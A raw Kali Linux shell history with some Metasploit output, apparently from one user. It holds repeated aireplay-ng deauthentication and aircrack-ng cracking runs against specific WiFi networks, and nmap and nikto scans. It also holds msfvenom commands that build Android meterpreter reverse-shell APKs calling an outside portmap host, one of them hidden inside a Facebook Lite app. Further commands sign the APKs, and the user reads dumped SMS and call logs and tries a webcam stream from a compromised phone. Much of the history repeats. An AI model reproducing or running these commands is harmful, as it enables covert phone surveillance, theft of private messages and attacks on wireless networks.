+  156  gcc t1.cpp -o v.exe
+  157  vim t1.cpp
+  158  gcc t1.cpp -o v.exe
+  159  vim t1.cpp
+  160  gcc t1.cpp -o v.exe
+  161  vim t1.cpp
+  162  gcc t1.cpp -o v.exe
+  163  vim t1.cpp
+  164  gcc t1.cpp -o v.exe
+  165  vim t1.cpp
+  166  gcc t1.cpp -o v.exe
+  167  vim t1.cpp
+  168  gcc t1.cpp -o v.exe
+  169  vim t1.cpp
+  170  gcc t1.cpp -o v.exe
+  171  gcc t1.cpp
+  172  gcc t1.cpp -o /root/Desktop/v.cpp
+  173  gcc t1.cpp
+  174  gcc t1.cpp -o /root/Desktop/v.cpp
+  175  gcc t1.cpp -o /root/Desktop/v.exe
+  176  wine v.ex
+  177  wine v.exe
+  178  gcc t1.cpp -o /root/Desktop/v.exe
+  179  gcc t1.cpp
+  180  vim t1.cpp
+  181  gcc t1.cpp -o /root/Desktop/v.exe
+  182  gcc t1.cpp -w /root/Desktop/v.exe
+  183  gcc t1.cpp -o /root/Desktop/v.exe
+  184  gcc --help
+  185  gcc t1.cpp -v -o /root/Desktop/v.exe
+  186  gcc --help
+  187  Place the output into <file>.
+  188  gcc t1.cpp -x c++ -v -o /root/Desktop/v.exe
+  189  nano t2.c
+  190  gcc t2.c -o /root/Desktop/v.exe
+  191  gcc t2.c
+  192  wine v.exe 
+  193  kali-undercover
+  194  aireplay-ng -0 8 -a E0:DC:FF:81:B1:AA wlan0mon
+  195  airmon-ng start wlan0
+  196  ifconfig 
+  197  airodump-ng wlan0mon
+  198  pwd
+  199  cd Desktop/
+  200  ls
+  201  cd wifi
+  202  ls
+  203  airodump-ng --bssid E0:DC:FF:81:B1:AA -c -w /root/Desktop/my wlan0mon
+  204  airodump-ng --bssid E0:DC:FF:81:B1:AA -c 11 -w /root/Desktop/my wlan0mon
+  205  airodump-ng --bssid E0:DC:FF:81:B1:AA -c 11 -w /root/Desktop/wifi/my wlan0mon
+  206  ls
+  207  aircrack-ng my-01.cap 
+  208  kali-undercover
+  209  poweroff 
+  210  kali-undercover
+  211  poweroff 
+  212  kali-undercover
+  213  poweroff 
+  214  wine BANK.EXE 
+  215  poweroff 
+  216  gcc t1.cpp 
+  217  cat t1.cpp 
+  218  ls /usr/bin/ld
+  219  ls
+  220  ls /usr/bin/
+  221  kali-undercover 
+  222  ls
+  223  cd ..
+  224  reboot 
+  225  useradd v
+  226  passwd v
+  227  su - v
+  228  ls
+  229  chmod 770 /root
+  230  ls
+  231  su - v
+  232  startx
+  233  ls
+  234  service network-manager restart 
+  235  reboot 
+  236  echo hello
+  237  history >>cmd.txt
+  238  apt-get install wine32
+  239  wine
+  240  cd /root/Desktop/
+  241  ls
+  242  wine v.exe 
+  243  bash | tee /root/Desktop/del/t.txt
+  244  ls
+  245  pwd
+  246  shell >>/root/Desktop/del/t3.txt
+  247  cat /bin/sh >>/root/Desktop/del/t3.txt
+  248  /bin/sh >>/root/Desktop/del/t3.txt
+  249  log
+  250  cat log
+  251  cat ~log
+  252  cat ~/log
+  253  history >cmd.txt
+  254  bash | tee >/root/Desktop/del/t.txt
+  255  ls
+  256  ls -la
+  257  bash | tee >>/root/Desktop/del/t.txt
+  258  ls
+  259  bash >>/root/Desktop/del/t2.txt
+  260  kwrite sources.list
+  261  ls
+  262  echo okk >t3.txt 
+  263  ls
+  264  cat t3.txt 
+  265  cat t.txt 
+  266  2>&1 > t3.txt 
+  267  ls
+  268  echo vikas
+  269  utility 2>&1 >output.log 
+  270  exec 1> >(tee -a outfile)
+  271  ls
+  272  cat out
+  273  cat output.log 
+  274  rm output.log 
+  275  ls
+  276  cat outfile 
+  277  cat /sbin/shutdown
+  278  1;2cls
+  279  ls
+  280  apt-get update && apt-get upgrade 
+  281  history | grep "fix"
+  282  yes | apt-get install --fix-broken
+  283  history | grep ".lst"
+  284  apt-get update && apt-get upgrade -y
+  285  ~
+  286  apt-get update && apt-get upgrade -y
+  287  exit
+  288  exit
+  289  kwrite sources.list
+  290  ls
+  291  apt-get update && apt-get upgrade -y
+  292  yes | apt-get install --fix-broken
+  293  yes | apt-get install --f
+  294  yes | apt-get install -f
+  295  yes | apt-get install virvirtualbox-dkms
+  296  yes | apt-get install virvirtualbox
+  297  yes | apt-get install virtualbox
+  298  yes | apt-get install virtualbox-dkms 
+  299  yes | apt-get install virtualbox
+  300  yes | apt-get install virtualbox-dkms 
+  301  virtualbox 
+  302  kali-undercover
+  303  poweroff 
+  304  ./VMware-Workstation-Full-15.5.0-14665864.x86_64.bundle 
+  305  vmware
+  306  reboot 
+  307  ifconfig 
+  308  192.168.0.128
+  309  ping 192.168.0.128
+  310  leafpad
+  311  cat t1.cpp 
+  312  cat t2.cpp 
+  313  cat t2.cp
+  314  cat t2.c 
+  315  gcc t2.c 
+  316  a.out
+  317  vim t.cpp
+  318  cat t1.cpp > t3.cpp
+  319  cat t3.cpp 
+  320  vim t3.cpp 
+  321  gcc t3.cpp 
+  322  vim t3.cpp 
+  323  gcc t3.cpp 
+  324  vim t3.cpp 
+  325  gcc t3.cpp 
+  326  gedit 
+  327  poweroff 
+  328  kali-undercover
+  329  poweroff 
+  330  nmap -A 192.168.0.129 -p-
+  331  nikto -h 192.168.0.129
+  332  nikto -h 192.168.0.129 --system-dns
+  333  nikto -vhost+ 192.168.0.129 
+  334  apt install youtube-dl
+  335  youtube-dl https://youtu.be/uWlCSbnvkYw
+  336  display djinn\ -\ 1\ walkthrough\ _\ vulnhub-uWlCSbnvkYw.mkv 
+  337  play djinn\ -\ 1\ walkthrough\ _\ vulnhub-uWlCSbnvkYw.mkv 
+  338  p
+  339  pvdisplay '/media/root/vikas1/1_buckup now/youtube/djinn - 1 walkthrough _ vulnhub-uWlCSbnvkYw.mkv' 
+  340  echo vikas | base63
+  341  echo vikas | base64
+  342  echo vikas | md5
+  343  echo vikas | base32
+  344  nmap -A 192.168.0.129 -p-
+  345  ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
+  346  |     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
+  347  |     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
+  348  |     Let's see how good you are with simple maths
+  349  |     Answer my questions 1000 times and I'll give you your gift.
+  350  |     '*', 1)
+  351  |   RPCCheck: 
+  352  |     ____ _____ _ 
+  353  |     ___| __ _ _ __ ___ ___ |_ _(_)_ __ ___ ___ 
+  354  |     \x20/ _ \x20 | | | | '_ ` _ \x20/ _ \n| |_| | (_| | | | | | | __/ | | | | | | | | | __/
+  355  |     ____|__,_|_| |_| |_|___| |_| |_|_| |_| |_|___|
+  356  |     Let's see how good you are with simple maths
+  357  |     Answer my questions 1000 times and I'll give you your gift.
+  358  |_    '+', 9)
+  359  7331/tcp open     http    Werkzeug httpd 0.16.0 (Python 2.7.15+)
+  360  |_http-server-header: Werkzeug/0.16.0 Python/2.7.15+
+  361  |_http-title: Lost in space
+  362  1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+  363  SF-Port1337-TCP:V=7.80%I=7%D=12/22%Time=5DFF52E4%P=x86_64-pc-linux-gnu%r(N
+  364  SF:ULL,1BC,"\x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+  365  SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x2
+  366  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__
+  367  SF:\x20_\x20_\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x2
+  368  SF:0__\x20___\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_
+  369  SF:\x20`\x20_\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\
+  370  SF:x20`\x20_\x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|
+  371  SF:\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20
+  372  SF:\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|
+  373  SF:\x20\|_\|\\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\
+  374  SF:n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
+  375  SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
+  376  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+  377  SF:\n\nLet's\x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20math
+  378  SF:s\nAnswer\x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x2
+  379  SF:0you\x20your\x20gift\.\n\(6,\x20'\*',\x201\)\n>\x20")%r(RPCCheck,1BC,"\
+  380  SF:x20\x20____\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+  381  SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20_____\x20_\x20\x20\x20\x20\x20\x20\
+  382  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20/\x20___\|\x20__\x20_\x20_
+  383  SF:\x20__\x20___\x20\x20\x20___\x20\x20\|_\x20\x20\x20_\(_\)_\x20__\x20___
+  384  SF:\x20\x20\x20___\x20\n\|\x20\|\x20\x20_\x20/\x20_`\x20\|\x20'_\x20`\x20_
+  385  SF:\x20\\\x20/\x20_\x20\\\x20\x20\x20\|\x20\|\x20\|\x20\|\x20'_\x20`\x20_\
+  386  SF:x20\\\x20/\x20_\x20\\\n\|\x20\|_\|\x20\|\x20\(_\|\x20\|\x20\|\x20\|\x20
+  387  SF:\|\x20\|\x20\|\x20\x20__/\x20\x20\x20\|\x20\|\x20\|\x20\|\x20\|\x20\|\x
+  388  SF:20\|\x20\|\x20\|\x20\x20__/\n\x20\\____\|\\__,_\|_\|\x20\|_\|\x20\|_\|\
+  389  SF:\___\|\x20\x20\x20\|_\|\x20\|_\|_\|\x20\|_\|\x20\|_\|\\___\|\n\x20\x20\
+  390  SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
+  391  SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
+  392  SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\nLet's\
+  393  SF:x20see\x20how\x20good\x20you\x20are\x20with\x20simple\x20maths\nAnswer\
+  394  SF:x20my\x20questions\x201000\x20times\x20and\x20I'll\x20give\x20you\x20yo
+  395  SF:ur\x20gift\.\n\(1,\x20'\+',\x209\)\n>\x20");
+  396  MAC Address: 08:00:27:31:31:DB (Oracle VirtualBox virtual NIC)
+  397  Device type: general purpose
+  398  Running: Linux 3.X|4.X
+  399  OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
+  400  OS details: Linux 3.2 - 4.9
+  401  Network Distance: 1 hop
+  402  Service Info: OS: Unix
+  403  kwrite /etc/resolv.conf 
+  404  kwrite /etc/hosts
+  405  http://192.168.0.129/
+  406  kwrite /etc/hosts
+  407  echo _alid_=zraQfkPoYJjCI/lYmtTlsw==
+  408  echo _alid_=zraQfkPoYJjCI/lYmtTlsw== | ascii
+  409  poweroff 
+  410  apt update
+  411  apt upgrade -y
+  412  poweroff 
+  413  history >> cmd_3.txt 
+  414  apt upgrade -y
+  415  kwrite /etc/
+  416  ls /etc/apt/sources.list
+  417  kwrite /etc/apt/sources.list
+  418  apt upgrade -y
+  419  kwrite /etc/apt/sources.list
+  420  apt upgrade -y
+  421  kwrite /etc/apt/sources.list
+  422  apt upgrade -y
+  423  kwrite /etc/apt/sources.list
+  424  apt upgrade -y
+  425  poweroff 
+  426  ping google.com
+  427  ping google.com
+  428  apt upgrade -y
+  429  poweroff 
+  430  exit
+  431  ping google.com
+  432  exit
+  433  exit
+  434  poweroff 
+  435  ./v.exe 
+  436  history 
+  437  history >>cmd.txt
+  438  g
+  439  gcc help
+  440  gcc --help
+  441  gcc FACTORIA.CPP 
+  442  gcc FACTORIA.CPP a
+  443  gcc FACTORIA.CPP a.out
+  444  gcc FACTORIA.CPP -w a.out
+  445  gcc FACTORIA.CPP -w /root/
+  446  gcc FACTORIA.CPP -w /root/Desktop/install/program/a.out
+  447  gcc FACTORIA.CPP -w /root/Desktop/install/program/
+  448  gcc FACTORIA.CPP -w /root/Desktop/install/program/v.exe
+  449  gcc FACTORIA.CPP  /root/Desktop/install/program/v.exe
+  450  gcc FACTORIA.CPP -o /root/Desktop/install/program/v.exe
+  451  gcc FACTORIA.CPP -o /root/Desktop/v.exe
+  452  gcc FACTORIA.CPP -o /root/Desktop/install/program/v.exe
+  453  gcc FACTORIA.CPP -o test
+  454  ./test
+  455  sudo gcc –o first FACTORIA.CPP 
+  456  sudo gcc FACTORIA.CPP –o first 
+  457  sudo gcc FACTORIA.CPP
+  458  sudo gcc FACTORIA.CPP –O first 
+  459  sudo gcc FACTORIA.CPP -o first 
+  460  ls
+  461  msfconsole 
+  462  pwd
+  463  apt-get install openvpn
+  464  ifconfig
+  465  msfvenom -p android/meterpreter/reverse_tcp lhost=Vijay2045-32711.portmap.host lport=32711 -o test1.apk
+  466  ls
+  467  pwd
+  468  msfvenom -p android/meterpreter/reverse_tcp lhost=Vijay2045-32711.portmap.host lport=32711 -o test2.apk
+  469  ls
+  470  cd /
+  471  ls
+  472  cd usr/
+  473  ls
+  474  cd..
+  475  cd ..
+  476  ls
+  477  cd var
+  478  ls
+  479  losf
+  480  apt-get install lsof
+  481  lsof -t -i:1234
+  482  lsof -n | grep tcp  | grep LISTEN | grep 1234
+  483  lsof -n | grep TCP  | grep LISTEN | grep 1234
+  484  kali `lsof -t -i:1234
+  485  kali `lsof -t -i:1234`
+  486  kill `lsof -t -i:1234`
+  487  lsof -n | grep TCP  | grep LISTEN | grep 1234
+  488  kali `lsof -t -i:1234`
+  489  kill `lsof -t -i:1234`
+  490  lsof -t -i:1234
+  491  kill 3145
+  492  lsof -t -i:1234
+  493  opnvpn Vijay_2045.Hack.ovpn 
+  494  openvpn Vijay_2045.Hack.ovpn
+  495  l
+  496  ls
+  497  cd /
+  498  ls
+  499  cd root
+  500  ls
+  501  cat sms_dump_20191229201913.txt 
+  502  ls
+  503  cat calllog_dump_20191229202017.txt 
+  504  apktool
+  505  apt-get install apk-tool
+  506  apt-get install apktool
+  507  apktool
+  508  openvpn Vijay_2045.Hack.ovpn
+  509  ifconfig
+  510  msfvenom -p  android/meterpreter/reverse_tcp lhost = 192.168.43.164 lport = 4321
+  511  msfvenom -p  android/meterpreter/reverse_tcp lhost=192.168.43.164 lport=4321 -o lo_t1.apk
+  512  openvpn Vijay_2045.Hack.ovpn
+  513  ifconfig
+  514  msfvenom -x /root/Desktop/install/kill/Facebook\ Lite_v178.0.0.11.121_apkpure.com.apk -p android/meterpreter/reverse_tcp lhost=Vijay2045-32711.portmap.host lport=32711 -o M_facebook.apk
+  515  apktool Facebook\ Lite_v178.0.0.11.121_apkpure.com.apk 
+  516  apktool Facebook\ Lite_v178.0.0.11.121_apkpure.com.apk -f -o test
+  517  poweroff
+  518  keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
+  519  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore (application_name).apk alias_name
+  520  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore test.apk alias_name
+  521  apt-get install jarsigner
+  522  jarsigner
+  523  apt-get install java
+  524  apt-get install open-jdk
+  525  sudo apt-get install openjdk-11-jdk
+  526  sudo apt-get install openjdk-11-jdk -y
+  527  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore test.apk alias_name
+  528  history >>cmd.txt
+  529  ls
+  530  pwd
+  531  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore test.apk alias_name
+  532  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore test2.apk alias_name
+  533  jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore /root/my-release-key.keystore test2.apk alias_name
+  534  history >>cmd.txt
+[*] 192.168.43.1 - Meterpreter session 6 closed.  Reason: Died
+[-] Failed to load extension: No module of the name android found
+[-] Failed to load extension: No module of the name android found
+Interrupt: use the 'exit' command to quit
+meterpreter > webcam_stream
+[-] Error running command webcam_stream: Rex::TimeoutError Operation timed out.
+msf5 exploit(multi/handler) > [-] Failed to load extension: No response was received to the core_enumextcmd request.
+[-] Failed to load extension: No response was received to the core_enumextcmd request.
+    1  leafpad /etc/resolv.conf
+    2  service network-manager restart 
+    3  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+    4  apt -f
+    5  apt-get -f
+    6  apt --fix
+    7  apt --fix-missing
+    8  sudo apt-get update –fix-missing
+    9  sudo dpkg –configure -a
+   10  yes | apt-get install --fix-broken
+   11  apt install virtualbox
+   12  sudo apt update
+   13  apt list --upgradable
+   14  sudo apt upgrade 
+   15  sudo apt upgrade -y && poweroff 
+   16  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+   17  yes | apt-get install --fix-broken
+   18  ping google.com
+   19  apt-get install gnome
+   20  poweroff
+   21  apt-get install gnome
+   22  y|  apt-get install gnome
+   23  y | apt-get install gnome
+   24  yes | apt-get install gnome
+   25  poweroff 
+   26  yes | apt-get install gnome
+   27  reboot 
+   28  apt-get install XFCE
+   29  git clone https://gitlab.com/kalilinux/packages/kali-undercover
+   30  sudo cp -r share /usr/
+   31  sudo cp bin/kali-undercover /usr/bin/
+   32  cp kali-undercover /usr/
+   33  cp -r share kali-undercover /usr/
+   34  cp -r kali-undercover /usr/
+   35  cd ~/kali-undercover/
+   36  sudo cp -r share /usr/
+   37  sudo cp bin/kali-undercover /usr/bin/
+   38  kali-undercover 
+   39  apt -y install kali-desktop-xfce 
+   40  pwd
+   41  ls
+   42  ls -la
+   43  ls -d
+   44  tree
+   45  kali-undercover 
+   46  kali-undercover
+   47  history 
+   48  history >> cmd.txt
+   49  winexe --ostype=1 --runas-file=tk17v10.0.57_setup_beta2.exe 
+   50  winexe --ostype=1 --interactive=1 --runas-file=tk17v10.0.57_setup_beta2.exe 
+   51  ls
+   52  ls /
+   53  cd /
+   54  thtk17v10.0.57_setup_beta2.exe
+   55  winexe tk17v10.0.57_setup_beta2.exe
+   56  apt -y install wine
+   57  wine
+   58  dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+   59  wine tk17v10.0.57_setup_beta2.exe 
+   60  sudo apt install linux-headers-$(uname -r) dkms
+   61  sudo apt-get install virtualbox-6.0
+   62  sudo apt install linux-headers-$(uname -r) dkms
+   63  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+   64  yes | apt-get install --fix-broken
+   65  ping google.com
+   66  dpkg -i virtualbox-6.0_6.0.8-130520~Ubuntu~bionic_amd64.deb 
+   67  yes | apt-get install --fix-broken
+   68  apt-get install vir.. 405613 files and directories currently installed.)
+   69  apt-get install virtulbox
+   70  sudo apt update
+   71  kali-undercover 
+   72  sudo apt update
+   73  vim /etc/resolv.conf 
+   74  sudo apt update
+   75  vim /etc/resolv.conf 
+   76  sudo apt update
+   77  nano /etc/apt/sources.list
+   78  vim /etc/apt/sources.list
+   79  sudo apt update
+   80  apt-get install youtube-dl 
+   81  vim /etc/apt/sources.list
+   82  apt-get install dkms build-essential 
+   83  wine
+   84  apt-get install wine32
+   85  wine32
+   86  apt-get install wine32
+   87  apt-get install wine64
+   88  apt-get install dkms build-essential 
+   89  dpkg --add-architecture i386 && apt-get update && apt-get install wine32
+   90  apt clean 
+   91  apt-get install dkms build-essential 
+   92  apt update
+   93  apt update && apt upgrade -y && apt dist-upgrade -y
+   94  apt update
+   95  apt update && apt upgrade -y && apt dist-upgrade -y
+   96  poweroff 
+   97  kali-undercover
+   98  apt update && apt upgrade -y && apt dist-upgrade -y
+   99  kali-undercover
+  100  ls
+  101  ls -l*.csa
+  102  ls -l.csa
+  103  aircrack-ng my-01.cap 
+  104  rm  
+  105  Opening my-01.capplease wait...
+  106  aireplay-ng -0 8 -a 56:DC:1D:9F:18:00 wlan0mon
+  107  aireplay-ng -0 1000 -a 56:DC:1D:9F:18:00 wlan0mon
+  108  aireplay-ng -0 10 -c EC:88:92:D4:BD:1C wlan0mon
+  109  aireplay-ng -0 1000 -a 56:DC:1D:9F:18:00 -c EC:88:92:D4:BD:1C wlan0mon
+  110  aireplay-ng -0 10 -c EC:88:92:D4:BD:1C wlan0mon
+  111  aireplay-ng -0 11 -a 56:DC:1D:9F:18:00 wlan0mon
+  112  aireplay-ng -0 5 -a 8C:44:35:0B:36:00 wlan0mon
+  113  airodump-ng --bssid 56:DC:1D:9F:18:00 -c 11 -w /root/Desktop/wifi/my wlan0mon
+  114  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  115  wine DirectX.exe 
+  116  aircrack-ng 
+  117  airodump-ng 
+  118  airmon-ng wlan0
+  119  airmon-ng start wlan0
+  120  airodump-ng wlan0mon
+  121  aireplay-ng -0 15 -c 8C:44:35:0B:36:00 wlan0mon
+  122  aireplay-ng -0 5 -a 8C:44:35:0B:36:00 wlan0mon
+  123  aireplay-ng -0 10 -a 8C:44:35:0B:36:00 wlan0mon
+  124  aireplay-ng -0 10 -a 8C:44:35:0B:36:00 -c 14:11:14:F5:F0:CB wlan0mon
+  125  aireplay-ng -0 15 -a 8C:44:35:0B:36:00 -c 14:11:14:F5:F0:CB wlan0mon
+  126  aireplay-ng -0 1 -a 8C:44:35:0B:36:00 wlan0mon
+  127  aireplay-ng -0 2 -a 8C:44:35:0B:36:00 wlan0mon
+  128  aireplay-ng -0 3 -a 8C:44:35:0B:36:00 wlan0mon
+  129  aireplay-ng -0 4 -a 8C:44:35:0B:36:00 wlan0mon
+  130  aireplay-ng -0 8 -a 8C:44:35:0B:36:00 wlan0mon
+  131  aireplay-ng -0 12 -a 8C:44:35:0B:36:00 wlan0mon
+  132  aireplay-ng -0 50 -a 8C:44:35:0B:36:00 wlan0mon
+  133  aireplay-ng -0 100 -a 8C:44:35:0B:36:00 wlan0mon
+  134  history >>cmd.txt
+  135  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my 
+  136  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  137  aircrack-ng my-01.cap 
+  138  aircrack-ng my-01.cap -w /root/Desktop/words/my
+  139  aircrack-ng my-01.cap 
+  140  aircrack-ng my-02.cap 
+  141  aircrack-ng my-03.cap 
+  142  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  143  airmon start wlan0
+  144  airmon-ng start wlan0
+  145  airodump-ng --bssid 8C:44:35:0B:36:00 -c 1 -w /root/Desktop/wifi/my wlan0mon
+  146  aireplay-ng -0 50 -a 8C:44:35:0B:36:00 wlan0mon
+  147  poweroff 
+  148  kali-undercover
+  149  gcc
+  150  ls 
+  151  cd Desktop/
+  152  ls
+  153  leafpad
+  154  vim t1.cpp
+  155  gcc t1.cpp v.exe
+  156  gcc t1.cpp -o v.exe
+  157  vim t1.cpp
+  158  gcc t1.cpp -o v.exe
+  159  vim t1.cpp
+  160  gcc t1.cpp -o v.exe
+  161  vim t1.cpp
+  162  gcc t1.cpp -o v.exe
+  163  vim t1.cpp
+  164  gcc t1.cpp -o v.exe
+  165  vim t1.cpp
+  166  gcc t1.cpp -o v.exe
+  167  vim t1.cpp
+  168  gcc t1.cpp -o v.exe
+  169  vim t1.cpp
+  170  gcc t1.cpp -o v.exe
+  171  gcc t1.cpp
+  172  gcc t1.cpp -o /root/Desktop/v.cpp
+  173  gcc t1.cpp
+  174  gcc t1.cpp -o /root/Desktop/v.cpp
+  175  gcc t1.cpp -o /root/Desktop/v.exe
+  176  wine v.ex
+  177  wine v.exe
+  178  gcc t1.cpp -o /root/Desktop/v.exe
+  179  gcc t1.cpp
+  180  vim t1.cpp
+  181  gcc t1.cpp -o /root/Desktop/v.exe
+  182  gcc t1.cpp -w /root/Desktop/v.exe
+  183  gcc t1.cpp -o /root/Desktop/v.exe
+  184  gcc --help
+  185  gcc t1.cpp -v -o /root/Desktop/v.exe
+  186  gcc --help
+  187  Place the output into <file>.
+  188  gcc t1.cpp -x c++ -v -o /root/Desktop/v.exe
+  189  nano t2.c
+  190  gcc t2.c -o /root/Desktop/v.exe
+  191  gcc t2.c
+  192  wine v.exe 
+  193  kali-undercover
+  194  aireplay-ng -0 8 -a E0:DC:FF:81:B1:AA wlan0mon
+  195  airmon-ng start wlan0
+  196  ifconfig 
+  197  airodump-ng wlan0mon
+  198  pwd
+  199  cd Desktop/
+  200  ls
+  201  cd wifi
+  202  ls
+  203  airodump-ng --bssid E0:DC:FF:81:B1:AA -c -w /root/Desktop/my wlan0mon
+  204  airodump-ng --bssid E0:DC:FF:81:B1:AA -c 11 -w /root/Desktop/my wlan0mon
+  205  airodump-ng --bssid E0:DC:FF:81:B1:AA -c 11 -w /root/Desktop/wifi/my wlan0mon
+  206  ls
+  207  aircrack-ng my-01.cap 
+  208  kali-undercover
+  209  poweroff 
+  210  kali-undercover
+  211  poweroff 
+  212  kali-undercover
+  213  poweroff 
+  214  wine BANK.EXE 
+  215  poweroff 
+  216  gcc t1.cpp 
+  217  cat t1.cpp 
+  218  ls /usr/bin/ld
+  219  ls
+  220  ls /usr/bin/
+  221  kali-undercover 
+  222  ls
+  223  cd ..
+  224  reboot 
+  225  useradd v
+  226  passwd v
+  227  su - v
+  228  ls
+  229  chmod 770 /root
+  230  ls
+  231  su - v
+  232  startx
+  233  ls
+  234  service network-manager restart 
+  235  reboot 
+  236  echo hello
+  237  history >>cmd.txt
+  238  apt-get install wine32
+  239  wine
+  240  cd /root/Desktop/
+  241  ls
+  242  wine v.exe 
+  243  bash | tee /root/Desktop/del/t.txt
+  244  ls
+  245  pwd
+  246  shell >>/root/Desktop/del/t3.txt
+  247  cat /bin/sh >>/root/Desktop/del/t3.txt
+  248  /bin/sh >>/root/Desktop/del/t3.txt
+  249  log
+  250  cat log
+  251  cat ~log
+  252  cat ~/log
+  253  history >cmd.txt
+  254  bash | tee >/root/Desktop/del/t.txt
+  255  ls
+  256  ls -la
+  257  bash | tee >>/root/Desktop/del/t.txt
+  258  ls
+  259  bash >>/root/Desktop/del/t2.txt
+  260  kwrite sources.list
+  261  ls
+  262  echo okk >t3.txt 
+  263  ls
+  264  cat t3.txt 
+  265  cat t.txt 
+  266  2>&1 > t3.txt 
+  267  ls
+  268  echo vikas
+  269  utility 2>&1 >output.log 
+  270  exec 1> >(tee -a outfile)
+  271  ls
+  272  cat out
+  273  cat output.log 
+  274  rm output.log 
+  275  ls
+  276  cat outfile 
+  277  cat /sbin/shutdown
+  278  1;2cls
+  279  ls
+  280  apt-get update && apt-get upgrade 
+  281  history | grep "fix"
+  282  yes | apt-get install --fix-broken
+  283  history | grep ".lst"
+  284  apt-get update && apt-get upgrade -y
+  285  ~
+  286  apt-get update && apt-get upgrade -y
+  287  exit
+  288  exit
+  289  kwrite sources.list
+  290  ls
+  291  apt-get update && apt-get upgrade -y
+  292  yes | apt-get install --fix-broken
+  293  yes | apt-get install --f
+  294  yes | apt-get install -f
+  295  yes | apt-get install virvirtualbox-dkms
+  296  yes | apt-get install virvirtualbox
+  297  yes | apt-get install virtualbox
+  298  yes | apt-get install virtualbox-dkms 
+  299  yes | apt-get install virtualbox
+  300  yes | apt-get install virtualbox-dkms 
+  301  virtualbox 
+  302  kali-undercover
+  303  poweroff 
+  304  ./VMware-Workstation-Full-15.5.0-14665864.x86_64.bundle 
+  305  vmware
+  306  reboot 
+  307  ifconfig 
+  308  192.168.0.128
+  309  ping 192.168.0.128
+  310  leafpad
+  311  cat t1.cpp 
+  312  cat t2.cpp 
+  313  cat t2.cp
+  314  cat t2.c 
+  315  gcc t2.c 
+  316  a.out
+  317  vim t.cpp
+  318  cat t1.cpp > t3.cpp
+  319  cat t3.cpp 
+  320  vim t3.cpp 
+  321  gcc t3.cpp 
+  322  vim t3.cpp 
+  323  gcc t3.cpp 
+  324  vim t3.cpp 
+  325  gcc t3.cpp 
+  326  gedit 
+  327  poweroff 
+  328  kali-undercover
+  329  poweroff 
+  330  nmap -A 192.168.0.129 -p-
+  331  nikto -h 192.168.0.129
+  332  nikto -h 192.168.0.129 --system-dns
+  333  nikto -vhost+ 192.168.0.129 
+  334  apt install youtube-dl
+  335  youtube-dl https://youtu.be/uWlCSbnvkYw
+  336  display djinn\ -\ 1\ walkthrough\ _\ vulnhub-uWlCSbnvkYw.mkv 
+  337  play djinn\ -\ 1\ walkthrough\ _\ vulnhub-uWlCSbnvkYw.mkv 
+  338  p
+  339  pvdisplay '/media/root/vikas1/1_buckup now/youtube/djinn - 1 walkthrough _ vulnhub-uWlCSbnvkYw.mkv' 
+  340  echo vikas | base63
+  341  echo vikas | base64
+  342  echo vikas | md5
+  343  echo vikas | base32
+  344  nmap -A 192.168.0.129 -p-
